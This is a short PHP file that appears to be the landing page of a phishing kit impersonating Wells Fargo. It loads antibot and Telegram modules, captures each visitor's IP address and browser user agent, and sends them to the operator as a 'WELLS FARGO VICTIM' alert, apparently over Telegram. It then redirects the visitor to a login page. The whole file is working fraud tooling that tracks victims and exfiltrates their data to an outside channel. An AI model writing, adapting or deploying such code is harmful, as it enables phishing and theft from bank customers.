<?php
ini_set('session.gc_maxlifetime', 1209600);
ob_start();
session_start();
include 'includes/antibot.php';
include 'includes/telegram.php';
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$_SESSION['id'] = md5($ip . $user_agent);
$msg = "WELLS FARGO VICTIM\n\n| DEVICE : #{$_SESSION['id']}\n| IP : {$ip}\n| USER AGENT : {$user_agent}";
send_message(urlencode($msg));
?>
<meta http-equiv="Refresh" content="0; url='login.php'" />
